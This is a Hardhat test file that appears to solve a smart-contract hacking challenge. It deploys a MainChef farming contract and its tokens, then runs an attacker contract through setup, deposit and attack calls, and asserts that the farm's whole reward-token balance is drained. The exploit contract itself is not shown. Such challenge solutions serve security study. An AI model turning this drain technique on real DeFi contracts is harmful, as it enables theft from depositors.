import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";
const BN = BigNumber;
let precision = BN.from(10).pow(18);

let accounts: Signer[];
let attacker: Signer;
let other1: Signer;
let other2: Signer;

let lpToken: Contract;
let khinkalToken: Contract;
let mainChef: Contract;

before(async () => {
  accounts = await ethers.getSigners();
  [attacker, other1, other2] = accounts;

  let other2Add = await other2.getAddress()

  const lpTokenFactory = await ethers.getContractFactory('LPToken')
  lpToken = await lpTokenFactory.connect(other2).deploy()

  const khinkalTokenFactory = await ethers.getContractFactory('KhinkalToken')
  khinkalToken = await khinkalTokenFactory.connect(other2).deploy()

  const mainChefFactory = await ethers.getContractFactory('MainChef')
  mainChef = await mainChefFactory.connect(other2).deploy(khinkalToken.address,other2Add,200_000,0,0,other2Add) // for easy math

  await khinkalToken.connect(other2).mint(mainChef.address,100_000) // mainChef starting supply of farm token
  await khinkalToken.connect(other2).transferOwnership(mainChef.address)

  await lpToken.connect(other2).transfer(await attacker.getAddress(),1_000)
  await mainChef.connect(other2).addToken(lpToken.address)
});

it("solves the challenge", async function () {

  const attackerLPFactory = await ethers.getContractFactory('MainChefAttackerLP')
  let attackerLP = await attackerLPFactory.connect(attacker).deploy(mainChef.address)

  await attackerLP.connect(attacker).attackSetup()
  await attackerLP.connect(attacker).deposit() // done separately b/c need to wait a block before rewards start
  await attackerLP.connect(attacker).startAttack()

});

after(async () => {
  expect(await khinkalToken.balanceOf(mainChef.address)).to.be.equal(0)
});
